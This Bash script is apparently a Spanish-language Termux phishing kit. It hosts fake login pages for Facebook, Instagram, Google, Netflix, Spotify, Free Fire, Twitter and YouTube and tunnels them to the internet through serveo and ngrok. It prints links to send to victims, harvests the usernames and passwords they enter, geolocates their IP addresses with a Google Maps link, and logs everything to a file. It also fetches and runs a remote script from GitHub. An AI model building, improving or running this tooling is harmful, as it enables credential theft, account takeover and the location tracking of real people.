Cesar=~/scam
R='\033[1;31m'                                                        G='\033[1;32m'                                                        Y='\033[1;33m'                                                        B='\033[1;34m'                                                        M='\033[1;35m'                                                        C='\033[1;36m'                                                        W='\033[0m'                                                           Gren='\033[32m'
Green='\033[32m'
IFS=$'\n\t'
trap ctrl_c 2
function ctrl_c () {
rm -rf $Cesar/cesar
rm -rf $Cesar/cesar.log
if [ -e $Cesar/.Gray/$gray/ip.txt ]; then
rm -rf $Cesar/.Gray/$gray/ip.txt
fi
if [ -e $Cesar/.Gray/$gray/usernames.txt ]; then
rm -rf $Cesar/.Gray/$gray/usernames.txt
fi
if [ -e $Cesar/.Gray/$gray/leeme.html ]; then
rm -rf $Cesar/.Gray/$gray/leeme.html
fi
if [ -e $Cesar/.Gray/$gray/Verificar/leeme.html ]; then
rm -rf $Cesar/.Gray/$gray/Verificar/leeme.html
fi
sleep 0.8
echo
echo
echo -e "$G[+]$W Finished"
echo -e "$G[+]$W Created by @CesarHackGray"
echo -e "$G[+]$W Gracias por usar mi herramienta"
echo -e "$G[+]$W servicio de ayuda https://t.me/CesarGray"
echo
echo
exit 2
}
function GPS1 {
cd $Cesar
rm -rf .ip.php
echo "<?php" >> .ip.php
echo "" >> .ip.php
echo '$data = @unserialize(file_get_contents("http://ip-api.com/php/'$ip'"));' >> .ip.php
echo '$FCL="\033[01;33m";' >> .ip.php
echo '$MCL="\033[01;37m>\033[01;32m";' >> .ip.php
echo '$NCL="\033[00m";' >> .ip.php
echo "" >> .ip.php
echo 'date_default_timezone_set($data["timezone"]);' >> .ip.php
echo "" >> .ip.php
echo "" >> .ip.php
printf 'if($data[' >> .ip.php
printf "'status'] == 'success') {\n" >> .ip.php
printf 'echo "\n ".$FCL."IP Address: ".$data[' >> .ip.php
printf "'query'];" >> .ip.php
printf 'echo "\n ".$FCL."Country code: ".$data[' >> .ip.php
printf "'countryCode'];\n" >> .ip.php
printf 'echo "\n ".$FCL."Country: ".$data[' >> .ip.php
printf "'country'];\n" >> .ip.php
printf 'echo "\n ".$FCL."Date & Time: ".date("F j, Y, g:i a"); ' >> .ip.php
printf 'echo "\n ".$FCL."Region code: ".$data[' >> .ip.php
printf "'region'];\n" >> .ip.php
printf 'echo "\n ".$FCL."Region: ".$data[' >> .ip.php
printf "'regionName'];\n" >> .ip.php
printf 'echo "\n ".$FCL."City: ".$data[' >> .ip.php
printf "'city'];\n" >> .ip.php
printf 'echo "\n ".$FCL."Zip code: ".$data[' >> .ip.php
printf "'zip'];\n" >> .ip.php
printf 'echo "\n ".$FCL."Time zone: ".$data[' >> .ip.php
printf "'timezone'];\n" >> .ip.php
printf 'echo "\n ".$FCL."ISP: ".$data[' >> .ip.php
printf "'isp'];\n" >> .ip.php
printf 'echo "\n ".$FCL."Organization: ".$data[' >> .ip.php
printf "'org'];\n" >> .ip.php
printf 'echo "\n ".$FCL."ASN: ".$data[' >> .ip.php
printf "'as'];\n" >> .ip.php
printf 'echo "\n ".$FCL."Latitude: ".$data[' >> .ip.php
printf "'lat'];" >> .ip.php
printf 'echo "\n ".$FCL."Longtitude: ".$data[' >> .ip.php
printf "'lon'];\n" >> .ip.php
printf 'echo "\n ".$FCL."Location:".$data[' >> .ip.php
printf "'lat']." >> .ip.php
printf '"+".$data[' >> .ip.php
printf "'lon'];\n" >> .ip.php
echo "} else {" >> .ip.php
echo 'echo "no hay informacion de la IP";' >> .ip.php
echo "}" >> .ip.php
echo "?>" >> .ip.php
apt install -y php &>> /dev/null
if [ -e .ip.php ]; then
rm -rf .datos.txt
php .ip.php >> .datos.txt
rm -rf .ip.php
fi
if [ -e .datos.txt ]; then
Code=$(cat .datos.txt|grep 'Country code:' | cut -d ":" -f2)
if [[ $Code != "" ]]; then
echo -e $G"[+]$W Código de país =$Green$Code"
fi
cat .datos.txt|grep 'Date & Time:*' | cut -d "i" -f2 >> log
date=$(cat log|grep -o ':.*')
if [[ $date != "" ]]; then
rm -rf log
echo -e $G"[+]$W Fecha y hora =$Green $date"
fi
region=$(cat .datos.txt|grep 'Region code:' | cut -d ":" -f2)
if [[ $region != "" ]]; then
echo -e $G"[+]$W Código de región =$Green$region"
fi
sity=$(cat .datos.txt|grep 'Region:' | cut -d ":" -f2)
if [[ $sity != "" ]]; then
echo -e $G"[+]$W Región =$Green$sity"
fi
zip=$(cat .datos.txt|grep 'Zip code:' | cut -d ":" -f2)
if [[ $zip != "" ]]; then
echo -e $G"[+]$W Código postal =$Green$zip"
fi
Gua=$(cat .datos.txt|grep 'Time zone:' | cut -d ":" -f2)
if [[ $Gua != "" ]]; then
echo -e $G"[+]$W Zona horaria =$Green$Gua"
fi
org=$(cat .datos.txt|grep 'Organization:' | cut -d ":" -f2)
if [[ $org != "" ]]; then
echo -e $G"[+]$W Organización =$Green$org"
fi
lat=$(cat .datos.txt|grep 'Latitude:' | cut -d ":" -f2)
if [[ $lat != "" ]]; then
echo -e $G"[+]$W Grado de latitud =$Green$lat"
fi
lon=$(cat .datos.txt|grep 'Longtitude:' | cut -d ":" -f2)
if [[ $lon != "" ]]; then
echo -e $G"[+]$W Grado de longitud =$Green$lon"
fi
lo=$(cat .datos.txt|grep 'ASN:' | cut -d ":" -f2)
if [[ $lo != "" ]]; then
echo -e $G"[+]$W ASN =$Green$lo"
fi
locat=$(cat .datos.txt|grep 'Location:' | cut -d ":" -f2)
if [[ $locat != "" ]]; then
echo -e "$G[+]$W Victima localizado Google maps :3"
sleep 0.2
echo -e "$G[+]$W URL =$Green https://www.google.com/maps/place/$locat"
fi
rm -rf .ip.php
rm -rf .datos.txt
fi
}
function GPS2 {
cd $Cesar
rm -rf Gray.log
GPS=$(curl -s -L "http://ip-api.com/php/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > Gray.log)
if [ -e Gray.log ]; then
cat Gray.log|grep -o ';s:65:".*";s:5' >> log
if [ -e log ]; then
ISP=$(cat log|grep -o '".*"')
fi
rm -rf log
echo -e $G"[+]$W ASN =$Green $ISP"
rm -rf log
cat Gray.log|grep -o ';s:20:".*";s:2:' >> log
if [ -e log ]; then
moviles=$(cat log|grep -o '".*"')
fi
rm -rf log
echo -e $G"[+]$W Organización =$Green $moviles"
cat Gray.log|grep -o ';s:5:"01014";s:3:' >> log
if [ -e log ]; then
postal=$(cat log|grep -o '".*"')
fi
rm -rf log
echo -e $G"[+]$W Código postal =$Green $postal"
cat Gray.log|grep -o ';s:2:".*";s:6:' >> log
if [ -e log ]; then
code=$(cat log|grep -o '".*"')
rm -rf log
fi
rm -rf log
echo -e $G"[+]$W Código de país =$Green $code"
rm -rf Gray.log
fi
}
function GPS {
cd $Cesar
rm -rf cesar
curl -s -L "https://www.infosniper.net/index.php?ip_address=$ip&k=&lang=3" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > cesar
apt install -y python2 &>> /dev/null
if [ -e .CesarHackGray ]; then
if [ -e cesar ]; then
python2 .CesarHackGray cesar > cesar.log
fi
fi
rm -rf cesar
if [ -e cesar.log ]; then
grep -o '>Diferencia de la Hora</div>;.*<' cesar.log | cut -d ">" -f3 | cut -d "&" -f1 >> gray.log
hora=$(grep -o ";.*" gray.log | cut -d "" -f3 | cut -d ";" -f2 | cut -d "<" -f1)
if [[ $hora != "" ]]; then
echo -e "$G[*]$W Diferencia de la hora =$Green $hora"
sleep 0.3
rm -rf gray.log
fi
grep -o '>Hostname</div>;.*<' cesar.log | cut -d ">" -f3 | cut -d "&" -f1 >> gray.log
hostame=$(grep -o ";.*" gray.log | cut -d "" -f3 | cut -d ";" -f2 | cut -d "<" -f1)
if [[ $hostame != "" ]]; then
echo -e "$G[*]$W Nombre de host =$Green $hostame"
sleep 0.3
rm -rf gray.log
fi
rm -rf gray.log
rm -rf cesar.log
fi
}
function informacion {
if [ -e $Cesar/.Gray/$gray/Verificar/ip.txt ]; then
version=$(grep -o ";.*;" $Cesar/.Gray/$gray/Verificar/ip.txt | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $version != "" ]]; then
echo -e "$G[*]$W Version =$Green $version"
sleep 0.3
fi
grep -o ",.*).*" $Cesar/.Gray/$gray/Verificar/ip.txt | cut -d "<" -f3 | cut -d ">" -f2 >> cesar.log
if [ -e cesar.log ]; then
navegador=$(grep -o ").*M" cesar.log | cut -d "<" -f3 | cut -d ">" -f2)
fi
if [[ $navegador != "" ]]; then
echo -e "$G[*]$W Navegador =$Green $navegador"
sleep 0.3
rm -rf cesar.log
fi
else
version=$(grep -o ";.*;" $Cesar/.Gray/$gray/ip.txt | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $version != "" ]]; then
echo -e "$G[*]$W Version =$Green $version"
sleep 0.3
fi
grep -o ",.*).*" $Cesar/.Gray/$gray/ip.txt | cut -d "<" -f3 | cut -d ">" -f2 >> cesar.log
if [ -e cesar.log ]; then
navegador=$(grep -o ").*M" cesar.log | cut -d "<" -f3 | cut -d ">" -f2)
fi
if [[ $navegador != "" ]]; then
echo -e "$G[*]$W Navegador =$Green $navegador"
sleep 0.3
rm -rf cesar.log
fi
fi
rm -rf iptracker.log
IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
if [ ! -e iptracker.log ]; then
echo -e "$B[$R!$B] Error no se encontro datos del IP :("
exit
fi
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
echo -e "$G[*]$W Reverse DNS =$Green $reverse_dns"
fi
if [[ $continent != "" ]]; then
echo -e "$G[*]$W Continente =$Green $continent"
fi
country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
echo -e "$G[*]$W Pais =$Green$country"
fi
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $city != "" ]]; then
echo -e "$G[*]$W Ubicacion de la Ciudad =$Green $city"
fi
isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
echo -e "$G[*]$W ISP =$Green $isp"
fi
as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
echo -e "$G[*]$W Numero AS =$Green $as_number"
fi
ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
echo -e "$G[*]$W Velocidad =$Green $ip_speed"
fi
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_currency != "" ]]; then
echo -e "$G[*]$W Moneda Nacional =$Green $ip_currency"
fi
rm -rf iptracker.log
}
function Facebook () {
echo -e "$G[+]$W Interactuando ala victima...$W"
while [ true ]; do
if [ -e $Cesar/.Gray/$gray/ip.txt ]; then
ip=$(grep -a 'IP:' $Cesar/.Gray/$gray/ip.txt | cut -d " " -f2 | tr -d '\r')
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "############\n"
sleep 1
echo -e "$G[+]$W La victima accedio al enlace :3.."
sleep 2
echo -e "$G[+]$W IP =$Gren $ip"
sleep 1
informacion
GPS
GPS1
if [ ! -e $Cesar/Hack.txt ]; then
touch $Cesar/Hack.txt
fi
echo "[+] ########################" >> $Cesar/Hack.txt
echo "[+] Fecha: $(date)" >> $Cesar/Hack.txt
echo "[+] Obtenido de $gray1" >> $Cesar/Hack.txt
echo "[+] IP = $ip" >> $Cesar/Hack.txt
rm -rf $Cesar/.Gray/$gray/ip.txt
fi
if [ -e $Cesar/.Gray/$gray/leeme.html ]; then
sleep 1
echo -e "$G[*]$W Contraseña que la victima coloco! :3"
sleep 1
email=$(cat $Cesar/.Gray/$gray/leeme.html|grep Email: | cut -d ":" -f2)
pass=$(cat $Cesar/.Gray/$gray/leeme.html|grep Pass: | cut -d ":" -f2)
sleep 1
echo -e "$G[+]$W UserName =$Gren $email"
sleep 1
echo -e "$G[+]$W Password =$Gren $pass"
sleep 1
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "############\n"
sleep 1
echo -e "$G[+]$W Interactuando ala victima...$W"
echo "[+] UserName = $email" >> $Cesar/Hack.txt
echo "[+] Password = $pass" >> $Cesar/Hack.txt
rm -rf $Cesar/.Gray/$gray/leeme.html
rm -rf $Cesar/.Gray/$gray/ip.txt
fi
done
}
function like {
echo -e "$G[+]$W Interactuando ala victima...$W"
while [ true ]; do
if [ -e $Cesar/.Gray/$gray/ip.txt ]; then
ip=$(grep -a 'IP:' $Cesar/.Gray/$gray/ip.txt | cut -d " " -f2 | tr -d '\r')
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "############\n"
sleep 1
echo -e "$G[+]$W La victima accedio al enlace :3.."
sleep 2
echo -e "$G[+]$W IP =$Gren $ip"
informacion
GPS
GPS1
if [ ! -e $Cesar/Hack.txt ]; then
touch $Cesar/Hack.txt
fi
echo "[+] ########################" >> $Cesar/Hack.txt
echo "[+] Fecha: $(date)" >> $Cesar/Hack.txt
echo "[+] Obtenido de $gray1" >> $Cesar/Hack.txt
echo "[+] IP = $ip" >> $Cesar/Hack.txt
rm -rf $Cesar/.Gray/$gray/ip.txt
fi
if [ -e $Cesar/.Gray/$gray/datos.txt ]; then
sleep 1
echo -e "$G[*]$W Contraseña que la victima coloco! :3"
sleep 1
pass=$(cat $Cesar/.Gray/$gray/datos.txt|grep email: | cut -d ":" -f2)
email=$(cat $Cesar/.Gray/$gray/datos.txt|grep Pass: | cut -d ":" -f2)
sleep 1
echo -e "$G[+]$W UserName =$Gren$pass"
sleep 1
echo -e "$G[+]$W Password =$Gren$email"
sleep 1
printf "$G[+]$W ########"
sleep 0.6
printf "##########"
sleep 1
printf "############\n"
echo -e "$G[+]$W Interactuando ala victima...$W"
echo "[+] UserName = $pass" >> $Cesar/Hack.txt
echo "[+] Password = $email" >> $Cesar/Hack.txt
rm -rf $Cesar/.Gray/$gray/datos.txt
rm -rf $Cesar/.Gray/$gray/ip.txt
fi
done
}
function bloqueo {
echo -e "$G[+]$W Interactuando ala victima...$W"
while [ true ]; do
if [ -e $Cesar/.Gray/$gray/Verificar/ip.txt ]; then
ip=$(grep -a 'IP:' $Cesar/.Gray/$gray/Verificar/ip.txt | cut -d " " -f2 | tr -d '\r')
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "############\n"
sleep 1
echo -e "$G[+]$W La victima accedio al enlace :3.."
sleep 1
printf "$G[+]$W IP =$Gren $ip\n"
informacion
GPS
GPS1
if [ ! -e $Cesar/Hack.txt ]; then
touch $Cesar/Hack.txt
fi
echo "[+] ########################" >> $Cesar/Hack.txt
echo "[+] Fecha: $(date)" >> $Cesar/Hack.txt
echo "[+] Obtenido de $gray1" >> $Cesar/Hack.txt
echo "[+] IP = $ip" >> $Cesar/Hack.txt
rm -rf $Cesar/.Gray/$gray/Verificar/ip.txt
fi
if [ -e $Cesar/.Gray/$gray/Verificar/leeme.html ]; then
original=$(cat $Cesar/.Gray/$gray/Verificar/leeme.html|grep original | cut -d ":" -f2)
nuevo=$(cat $Cesar/.Gray/$gray/Verificar/leeme.html|grep Nuevo | cut -d ":" -f2)
comfir=$(cat $Cesar/.Gray/$gray/Verificar/leeme.html|grep Confir | cut -d ":" -f2)
sleep 1
echo -e "$G[*]$W Contraseñas que la victima coloco! :3"
sleep 2
echo -e "$G[+]$W Password Actual =$Gren$original"
sleep 1
echo -e "$G[+]$W Password Nuevo  =$Gren$nuevo"
sleep 1
echo -e "$G[+]$W Password Comfir =$Gren$comfir"
echo "[+] Password Actual = $original" >> $Cesar/Hack.txt
echo "[+] Password Nuevo  = $nuevo" >> $Cesar/Hack.txt
echo "[+] Password Comfir = $comfir" >>  $Cesar/Hack.txt
rm -rf $Cesar/.Gray/$gray/Verificar/leeme.html
sleep 1
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "############\n"
sleep 1
echo -e "$G[+]$W Interactuando ala victima...$W"
fi
done
}
function facebook () {
echo -e "$G[+]$W Interactuando ala victima...$W"
while [ true ]; do
if [ -e $Cesar/.Gray/$gray/ip.txt ]; then
ip=$(grep -a 'IP:' $Cesar/.Gray/facebook/ip.txt | cut -d " " -f2 | tr -d '\r')
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "############\n"
sleep 1
echo -e "$G[+]$W La victima accedio al enlace :3.."
sleep 1
printf "$G[+]$W IP =$Gren $ip\n"
informacion
GPS
GPS1
if [ ! -e $Cesar/Hack.txt ]; then
touch $Cesar/Hack.txt
fi
echo "[+] ########################" >> $Cesar/Hack.txt
echo "[+] Fecha: $(date)" >> $Cesar/Hack.txt
echo "[+] Obtenido de $gray1" >> $Cesar/Hack.txt
echo "[+] IP = $ip" >> $Cesar/Hack.txt
rm -rf $Cesar/.Gray/$gray/ip.txt
fi
if [ -e $Cesar/.Gray/$gray/leeme.html ]; then
sleep 1
echo -e "$G[*]$W Contraseña que la victima coloco! :3"
sleep 1
contra=$(cat $Cesar/.Gray/facebook/leeme.html|grep Usuario | cut -d ":" -f2)
email=$(cat $Cesar/.Gray/facebook/leeme.html|grep Contrasena | cut -d ":" -f2)
sleep 2
echo -e "$G[+]$W UserName =$Gren $contra"
sleep 1
echo -e "$G[+]$W Password =$Gren $email"
echo "[+] UserName = $email" >> $Cesar/Hack.txt
echo "[+] Password = $contra" >> $Cesar/Hack.txt
rm -rf $Cesar/.Gray/$gray/leeme.html
sleep 1
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "############\n"
sleep 1
echo -e "$G[+]$W Interactuando ala victima...$W"
fi
done
}
function hacking () {
if [ ! -e ~/scam ]; then
echo -e $G"[$!$G]$W No estoy instalado en HOME :("
echo -e $G"[$!$G]$W mueveme a HOME para poder trabajar"
exit
fi
if [ -e ~/scam/install.sh ]; then
echo -e $G"[$!$G]$W Primero ejecuta$G bash install.sh"
exit
fi
echo -e "$G[+]$W Abriendo servidores..."
sleep 2
echo -e "$G[+]$W Abriendo servidor php..."
LPORT1=$(shuf -i 1111-9999 -n 1)
cd $Cesar/.Gray/$gray && php -S localhost:$LPORT1 > /dev/null 2>&1 &
sleep 5
echo -e "$G[+]$W Abriendo servidor ssh..."
if [ -e ~/scam/falso ]; then
rm ~/scam/falso
fi
cd $Cesar
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$LPORT1' serveo.net 2> /dev/null > ~/scam/falso ' &
sleep 10
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" ~/scam/falso)
rm -rf falso
sleep 3
echo -e "$G[+]$W Abriendo servidor ngrok.."
sleep 1
if [ ! -e $Cesar/ngrok ]; then
cd $Cesar
echo -e "$G[+]$W Descargando ngrok full...."
wget https://raw.githubusercontent.com/Cesar-Hack-Gray/release-download/master/fix-ar-ngrok > /dev/null 2>&1
if [ ! -e fix-ar-ngrok ]; then
sleep 1
echo -e "$G[$R+$G]$W Error ngrok no se descargo :( "
echo -e "$G[$R+$G]$W Verifica tu conexion a internet"
exit 1
fi
bash fix-ar-ngrok > /dev/null 2>&1
cp $PREFIX/bin/ngrok $Cesar
if [ -e fix-ar-ngrok ]; then
rm fix-ar-ngrok
fi
fi
cd $Cesar
LPORT=$(shuf -i 1111-9999 -n 1)
cd $Cesar/.Gray/$gray && php -S localhost:$LPORT > /dev/null 2>&1 &
ngrok http 127.0.0.1:$LPORT > /dev/null 2>&1 &
sleep 10
link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep   -o 'https://[a-z0-9-]\{2,4\}\+.ngrok.io')
sleep 2
echo -e "$G[+]$W Obteniendo URLs.."
sleep 2
echo -e "$G[+]$W Servicio de ayuda =$Gren https://t.me/CesarGray"
sleep 0.8
if [ -e $Cesar/.Gray/$gray/Verificar ]; then
echo -e "$G[+]$W Envia ala victima =$Gren http://localhost:$LPORT1/Verificar/id=1.php"
else
echo -e "$G[+]$W Envia ala victima =$Gren http://localhost:$LPORT1"
fi
sleep 0.9
if [[ $send_link != "" ]]; then
if [ -e $Cesar/.Gray/$gray/Verificar ]; then
echo -e "$G[+]$W Envia ala victima =$Gren $send_link/Verificar/id=1.php"
else
echo -e "$G[+]$W Envia ala victima =$Gren $send_link"
fi
sleep 0.9
fi
if [[ $link != "" ]]; then
if [ -e $Cesar/.Gray/$gray/Verificar ]; then
echo -e "$G[+]$W Envia ala victima =$Gren $link/Verificar/id=1.php"
else
echo -e "$G[+]$W Envia ala victima =$Gren $link"
sleep 0.6
fi
fi
if [ -e $Cesar/.Gray/$gray/facebook.html ]; then
facebook
exit
fi
if [ -e $Cesar/.Gray/$gray/login_form_mb.php ]; then
Facebook
exit
fi
if [ -e $Cesar/.Gray/$gray/admin.php ]; then
like
exit
fi
if [ -e $Cesar/.Gray/$gray/Verificar ]; then
bloqueo
exit
fi
echo -e "$G[+]$W Interactuando ala victima..$W"
while [ true ]; do
if [[ -e "$Cesar/.Gray/$gray/ip.txt" ]]; then
printf "$G[+]$W ########"
sleep 0.6
printf "##########"
sleep 0.5
printf "############\n"
sleep 1
sleep 2
echo -e "$G[+]$W La victima accedio al enlace :3.."
sleep 4
ip=$(grep -a 'IP:' $Cesar/.Gray/$gray/ip.txt | cut -d " " -f2 | tr -d '\r')
sleep 2
echo -e "$G[+]$W IP =$Gren $ip "
sleep 1
if [ ! -e $Cesar/Hack.txt ]; then
touch $Cesar/Hack.txt
fi
echo "[+] ########################" >> $Cesar/Hack.txt
echo "[+] Fecha: $(date)" >> $Cesar/Hack.txt
echo "[+] Obtenido de $gray1" >> $Cesar/Hack.txt
echo "[+] IP = $ip" >> $Cesar/Hack.txt
informacion
GPS
GPS1
rm -rf $Cesar/.Gray/$gray/ip.txt
fi
if [ -e $Cesar/.Gray/$gray/usernames.txt ]; then
sleep 1
echo -e "$G[*]$W Contraseña que la victima coloco! :3"
sleep 1
password=$(grep -o 'Pass:.*' $Cesar/.Gray/$gray/usernames.txt | cut -d ":" -f2)
account=$(grep -o 'Account:.*' $Cesar/.Gray/$gray/usernames.txt | cut -d " " -f2)
echo -e "$G[+]$W UserName =$Gren $account"
sleep 3
echo -e "$G[+]$W password =$Gren$password"
sleep 1
echo "[+] UserName = $email" >> $Cesar/Hack.txt
echo "[+] Password = $contra" >> $Cesar/Hack.txt
rm -rf $Cesar/.Gray/$gray/usernames.txt
printf "$G[+]$W ########"
sleep 0.8
printf "##########"
sleep 0.7
printf "############\n"
sleep 1
echo -e "$G[+]$W Interactuando ala victima..$W"
fi
done
}
function chanel {
termux-open-url http://youtube.com/c/CésarHackGray_Y_Miickeyy
help
}
function otro {
if [ -e $Cesar/.Gray/$gray/leeme.html ]; then
echo -e "$G[+]$W Datos encontrados..."
sleep 2
contrase=$(cat $Cesar/.Gray/$gray/leeme.html|grep -o -P 'Contrasena:</b>[^\"]+')
echo -e "$G[+]$W Usuario "
echo -e "$G[+]$W $contrase"
sleep 2
rm -rf $Cesar/.Gray/$gray/leeme.html
fi
}
function help () {
rm -rf ~/scam/README.md
echo
echo "  ==============="
echo "  Cesar-Hack-Gray"
echo "  ==============="
echo
echo "  Usage: "
echo
echo " ./phishing.sh --use -facebook-pc"
echo " ./phishing.sh --use -Facebook"
echo " ./phishing.sh --use -instagram"
echo " ./phishing.sh --use -google"
echo " ./phishing.sh --use -netflix"
echo " ./phishing.sh --use -spotify"
echo " ./phishing.sh --use -freefire"
echo " ./phishing.sh --use -facebook-bloqueo"
echo " ./phishing.sh --use -twiter-auto-seguidores"
echo " ./phishing.sh --use -Facebook-auto-likes"
echo " ./phishing.sh --use -Youtube-auto-suscriptores"
echo " ./phishing.sh --ver -passwords"
echo " ./phishing.sh --viste --channel"
echo
exit
}
if [ ! -z $1 ] || [ ! -z $2 ]; then
case $1 in
"--use")
;;
"--ver")
;;
"--viste")
;;
*)
echo -e "$G[$Y!$G]$W Comando invalido:$R ${1}$W"
help
;;
esac
case $2 in
"-freefire")
gray="freefire"
gray1="Free Fire"
hacking
;;
"-facebook-bloqueo")
gray="seguridad"
gray1="Facebook Bloqueo"
hacking
;;
"-facebook-pc")
gray="facebook"
gray1="Facebook PC"
hacking
;;
"-instagram")
gray="instagram"
gray1="Instagram"
hacking
;;
"-google")
gray="google"
gray1="Google"
hacking
;;
"-netflix")
gray="netflix"
gray1="Netflix"
hacking
;;
"-spotify")
gray="spotify"
gray1="Spotify"
hacking
;;
"-Facebook")
gray="scam"
gray1="Facebook"
hacking
;;
"-Facebook-auto-likes")
gray="2do"
gray1="Facebook Auto Likes"
hacking
;;
"-Youtube-auto-suscriptores")
gray="youtube"
gray1="YouTube"
hacking
;;
"-twiter-auto-seguidores")
gray="twiter"
gray1="Twitter"
hacking
;;
"--channel")
chanel
;;
"-passwords")
if [ ! -e ~/scam/Hack.txt ]; then
echo -e $G"[$Y!$G]$W Aun no hay contraseñas obtenidas"
exit
fi
cat ~/scam/Hack.txt
;;
*)
echo -e "$G[$Y!$G]$W Comando invalido:$R ${2}$W"
help
esac
else
help
fi
